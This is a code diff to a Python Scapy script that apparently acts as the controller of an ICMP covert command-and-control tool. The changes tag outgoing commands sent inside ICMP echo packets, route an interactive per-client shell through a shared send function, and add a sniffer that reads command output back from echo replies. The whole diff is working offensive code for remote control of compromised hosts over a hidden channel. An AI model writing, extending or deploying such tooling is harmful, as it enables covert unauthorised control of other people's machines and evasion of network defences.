@@ -71,7 +71,8 @@ def send_command(arguments, clients):
 
 # Reduced redundency in 
 def send_over_icmp(clientip, command):
-    evil = IP(dst=clientip)/ICMP(type=8)/(command)
+    clientcommand = "!!!" + command
+    evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
     send(evil)
 
 # Send command to all clients
@@ -90,9 +91,8 @@ def shell(clients, arguments):
         command = input(f"{clients.get(int(arguments[1]))} >> ")
         if command == "kill":
             break
-        evil = IP(dst=clients.get(clients.get(arguments[1])))/ICMP(type=8)/(command)
+        send_over_icmp(clients.get(arguments[1]), command)
         if DEBUG: print(f"[DEBUG] \"{command}\" sent to {arguments[1]} at {clients.get(int(arguments[1]))}")
-        send(evil)
 
 # Checks if an IP is valid
 def valid_IP(arguments):
@@ -117,7 +117,15 @@ def generate_targets(JSONFILE, clients, id):
     f.close()
     return id
 
+def listen(pkt):
+    src = pkt[IP].dst 
+    payload = str(pkt.payload)
+    parsed = re.split('#{3}', payload)
+    command = parsed[1][:-1]
+    print(f"Recieved: {command} from {src}")
+
 def main():
+    sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)
     clients = dict()
     id = 0
     while(True):
